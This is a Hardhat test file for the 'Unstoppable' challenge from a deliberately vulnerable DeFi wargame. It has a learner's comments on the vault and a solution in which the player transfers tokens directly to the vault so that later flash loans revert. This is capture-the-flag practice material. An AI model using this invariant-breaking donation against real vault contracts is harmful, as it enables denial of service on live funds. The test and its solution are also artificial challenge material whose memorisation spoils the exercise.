const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Unstoppable", function () {
  let deployer, player, someUser;
  let token, vault, receiverContract;

  const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;
  const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    [deployer, player, someUser] = await ethers.getSigners();

    /**
     * @dev _mints new token,
     * totalSupply = max(uint256);
     * balanceOf[deployer.address] = max(uint256);
     * can mint it but deployer wont be owner cuzz no owner policiy in erc20
     */
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    /**
     * @dev feeReciepient = deployer.address
     * asset = #DVT
     * owner = deployer.address
     */
    vault = await (
      await ethers.getContractFactory("UnstoppableVault", deployer)
    ).deploy(token.address, deployer.address, deployer.address);
    expect(await vault.asset()).to.eq(token.address);

    /**
     * @dev approves the vault.address to spend deployer's token in #DVT token
     * allowance[msg.sender][#UNT] = 10^6
     */
    await token.approve(vault.address, TOKENS_IN_VAULT);

    /**
     * @check ERC777s could reenter, so transfers.
     * @dev 1) calculates shares based on assets i.e 10^6
     * 2) makes changes to #DVT contract as :
     *  2.a) adds TOKENS_IN_VAULT to #UNS to balnceOf #DVT
     *  2.b) reduces TOKENS_IN_VAULT from deployer's balanceOf
     *  2.c) reduces TOKENS_IN_VAULT from deployer's allowance
     * 3)totalSupply = shares only if totalSupply = 0 or else calculate shares.
     * 4)balanceof deployer = TOKENS_IN_VAULT
     * @dev calls safetransferfrom where caller(#UNS) is not the owner of #DVT
     */
    await vault.deposit(TOKENS_IN_VAULT, deployer.address);

    expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT);

    /**
     * @return balanceof[#UNS] from #DVT
     */
    expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT);

    /**
     * @return totalsupply of #UNS
     */
    expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);

    /**
     * @return calls vault.totalAssets();
     */
    expect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT);

    /**
     * @return fee = 0 as TOKENS_IN_VAULT - 1n < balanceof[#UNS] from #DVT
     */
    expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0);

    /**
     * @return fee = 5 * 10^22 wei if TOKENS_IN_VAULT = balanceof[#UNS] from #DVT.
     */
    expect(await vault.flashFee(token.address, TOKENS_IN_VAULT)).to.eq(
      50000n * 10n ** 18n
    );

    /**
     *  @dev 1) msg.sender(deployer's) amount reduced by 10 from balanceOf of #DVT
     *  2) added player with 10DVT in balanceOf #DVT.
     */
    await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);

    /**
     * @returns the balanceOf player from #DVT
     */
    expect(await token.balanceOf(player.address)).to.eq(
      INITIAL_PLAYER_TOKEN_BALANCE
    );

    // Show it's possible for someUser to take out a flash loan
    /**
     * @dev sets someUser as owner & pool = #UNS(vault)
     */
    receiverContract = await (
      await ethers.getContractFactory("ReceiverUnstoppable", someUser)
    ).deploy(vault.address);

    /**
     * @dev 1) Only Owner can call.
    /**
     * @inheritdoc IERC3156FlashLender
     * @dev checks :
     * 1) amount can not be zero,
     * 2) asset = #DVT(enforce ERC3156 requirement)
     * 3) token.balanceOf[this(#UNS)]
     * 4) converts totalSupply to shares // might need to look into it to_hack.
     * 5) fee is mostly 0, will look later in detail.
     * 6) token.balanceOf[#UNS] - amount && token.balanceOf[reciever] + amount
     * 7) token.allowance(msg.sender, pool(#UNS)) -> amount
     * 8) token.balanceOF(this(#UNS)) + amount
     * below value doesnot go to negative 0 is the end :
     * 9) balanceOf(receiver) - (amount + fee) (100)
     * 10) token.allowance(receiver, this(#UNS)) - (amount + fee) (100)
     * 11) adds fee to balanceOf(feeRecipient) from token.
     * 12) removes fee from balanceOf(caller) from token.
     */
    await receiverContract.executeFlashLoan(100n * 10n ** 18n);
  });

  it("Execution", async function () {
    await token
      .connect(player)
      .transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // It is no longer possible to execute flash loans
    await expect(
      receiverContract.executeFlashLoan(100n * 10n ** 18n)
    ).to.be.reverted;
  });
});
